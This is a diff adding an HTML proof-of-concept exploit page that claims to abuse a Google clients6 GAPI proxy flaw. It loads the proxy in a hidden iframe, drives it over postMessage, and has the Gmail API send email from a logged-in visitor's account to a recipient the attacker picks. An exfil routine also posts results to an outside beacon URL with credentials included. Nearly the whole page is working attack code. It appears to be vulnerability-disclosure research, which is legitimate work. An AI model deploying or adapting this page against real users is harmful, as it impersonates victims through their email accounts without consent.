@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>clients6 GAPI Root Proxy — Gmail SEND as Victim (NEW-002 CRITICAL)</title>
+<style>
+body { font-family: monospace; background: #0d0d0d; color: #00ff88; margin: 20px; }
+h2 { color: #ff4444; }
+.warn { color: #ffaa00; }
+.ok { color: #00ff88; }
+.data { color: #44aaff; word-break: break-all; }
+.crit { color: #ff4444; font-weight: bold; }
+pre { background: #1a1a1a; padding: 10px; border-left: 3px solid #333; overflow-x: auto; white-space: pre-wrap; }
+#log { max-height: 600px; overflow-y: auto; }
+input, textarea { background: #1a1a1a; color: #00ff88; border: 1px solid #444; padding: 5px; width: 100%; margin: 3px 0; font-family: monospace; }
+button { background: #ff4444; color: #fff; border: none; padding: 8px 16px; cursor: pointer; font-family: monospace; margin: 5px 0; }
+</style>
+</head>
+<body>
+
+<h2>clients6 GAPI Root Proxy — Gmail SEND as Victim (NEW-002 CRITICAL)</h2>
+
+<p class="warn">
+<b>Bug class:</b> GAPI XD3 proxy hash injection → makeHttpRequests → POST /gmail/v1/users/me/messages/send<br>
+<b>Impact:</b> Sends email FROM victim's Gmail account to any recipient.<br>
+<b>Auth:</b> No API key needed (Gmail send returns 401, not 403 — SAPISIDHASH only).
+</p>
+
+<hr>
+<p class="ok">Configure email to send (runs automatically on page load with defaults, OR fill manually):</p>
+<label>To: <input id="to" value="attacker@example.com"></label>
+<label>Subject: <input id="subject" value="Test from clients6 PoC (NEW-002)"></label>
+<label>Body (plain text):
+<textarea id="body" rows="4">This email was sent via the GAPI XD3 proxy bug.
+It was sent FROM the victim's Gmail account without their knowledge.
+Sent at: TIMESTAMP</textarea>
+</label>
+<button onclick="init(true)">Send Email Now</button>
+
+<hr>
+<div id="log"></div>
+
+<script>
+const logEl = document.getElementById('log');
+
+function log(cls, msg) {
+  const d = document.createElement('pre');
+  d.className = cls;
+  d.textContent = '[' + new Date().toISOString().slice(11,23) + '] ' + msg;
+  logEl.prepend(d);
+  console.log(cls.toUpperCase(), msg);
+}
+
+const EXFIL_URL = 'https://colab.research.google.com/__poc_gmail_send_beacon';
+function exfil(data) {
+  fetch(EXFIL_URL, {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data),
+  }).catch(() => {});
+}
+
+function buildRFC2822(to, subject, body) {
+  const bodyWithTime = body.replace('TIMESTAMP', new Date().toISOString());
+  const lines = [
+    'MIME-Version: 1.0',
+    'To: ' + to,
+    'Subject: ' + subject,
+    'Content-Type: text/plain; charset=UTF-8',
+    'Content-Transfer-Encoding: 7bit',
+    '',
+    bodyWithTime
+  ];
+  const raw = lines.join('\r\n');
+  // base64url encode
+  return btoa(unescape(encodeURIComponent(raw)))
+    .replace(/\+/g, '-')
+    .replace(/\//g, '_')
+    .replace(/=+$/, '');
+}
+
+let proxyIframe = null;
+let ackSent = false;
+let requestSent = false;
+
+function init(send) {
+  if (typeof gapi !== 'undefined' || document.querySelector('script[src*="apis.google.com"]')) {
+    log('warn', '⚠️  GAPI CONTAMINATION — open in fresh tab');
+  }
+
+  const rpcToken = 'send' + Math.random().toString(36).substr(2, 12);
+  const parentOrigin = location.origin;
+  ackSent = false;
+  requestSent = false;
+
+  log('ok', 'Init: parent=' + parentOrigin + ' rpcToken=' + rpcToken);
+
+  if (proxyIframe) proxyIframe.remove();
+  proxyIframe = document.createElement('iframe');
+  proxyIframe.style.cssText = 'display:none;width:1px;height:1px;';
+  proxyIframe.src = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
+    '#parent=' + encodeURIComponent(parentOrigin) +
+    '&rpctoken=' + rpcToken +
+    '&origin=' + encodeURIComponent(parentOrigin);
+  document.body.appendChild(proxyIframe);
+
+  log('ok', 'Proxy iframe injected.');
+
+  const handler = function(e) {
+    if (e.source !== proxyIframe.contentWindow) return;
+    const raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+    if (raw.length < 500) log('data', 'PROXY→PARENT: ' + raw);
+
+    let msg;
+    try { msg = JSON.parse(e.data); } catch(err) { return; }
+    if (!msg) return;
+
+    // ACK handshake
+    if (!ackSent && msg.s && msg.s.startsWith('ready:') && msg.g === true) {
+      ackSent = true;
+      log('ok', 'Ready signal (g:true). Sending ACK...');
+      proxyIframe.contentWindow.postMessage(JSON.stringify({
+        s: '..', f: msg.s, c: msg.c, a: [], t: rpcToken, l: null, g: false
+      }), 'https://clients6.google.com');
+      if (send) setTimeout(() => sendEmail(rpcToken), 500);
+      else log('ok', 'ACK sent. Call sendEmail() or click button to proceed.');
+      return;
+    }
+
+    // Callback
+    if (!msg.f || !msg.f.includes('_callbacks_')) return;
+    log('ok', 'Callback: ' + msg.f);
+    const [err, responses] = Array.isArray(msg.a) ? msg.a : [null, null];
+    if (err) { log('warn', 'RPC error: ' + JSON.stringify(err)); return; }
+    if (!Array.isArray(responses)) return;
+
+    responses.forEach((resp, idx) => {
+      if (!resp) return;
+      log((resp.status === 200 ? 'crit' : 'warn'), '[' + idx + '] HTTP ' + resp.status + ' — ' + String(resp.body).substring(0, 400));
+      if (resp.status === 200) {
+        let data;
+        try { data = JSON.parse(resp.body); } catch(e) { data = {raw: resp.body}; }
+        if (data.id) {
+          log('crit', '🎯 ✅ EMAIL SENT! Gmail Message ID: ' + data.id);
+          log('crit', '   threadId: ' + data.threadId);
+          exfil({ type: 'gmail_send', messageId: data.id, threadId: data.threadId });
+        }
+      } else if (resp.status === 401) {
+        log('warn', '401 — not logged into Google on this browser');
+      } else if (resp.status === 403) {
+        log('warn', '403 — ' + resp.body.substring(0, 200));
+      }
+    });
+  };
+
+  window.addEventListener('message', handler);
+
+  setTimeout(function() {
+    if (!ackSent) {
+      log('warn', '5s: No ready signal. Trying without ACK...');
+      if (send) sendEmail(rpcToken);
+    }
+  }, 5000);
+}
+
+function sendEmail(rpcToken) {
+  if (requestSent) return;
+  requestSent = true;
+
+  const to = document.getElementById('to').value;
+  const subject = document.getElementById('subject').value;
+  const body = document.getElementById('body').value;
+  const raw = buildRFC2822(to, subject, body);
+
+  log('ok', 'Sending Gmail send request...');
+  log('ok', 'To: ' + to);
+  log('ok', 'Subject: ' + subject);
+
+  const requests = [
+    {
+      url: '/gmail/v1/users/me/messages/send',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ raw: raw }),
+      responseExpected: true
+    }
+  ];
+
+  proxyIframe.contentWindow.postMessage(
+    JSON.stringify({
+      s: '..',
+      f: 'makeHttpRequests',
+      c: 'gmail-send-1',
+      a: [requests],
+      t: rpcToken,
+      l: null,
+      g: true
+    }),
+    'https://clients6.google.com'
+  );
+
+  log('ok', 'makeHttpRequests sent. Waiting for callback...');
+}
+
+// Auto-run on page load (defaults only — for demo, shows confirmation of email being sent)
+// Comment out the next line to require manual button click instead:
+init(false);  // false = wait for ACK, then require button click to send
+</script>
+</body>
+</html>
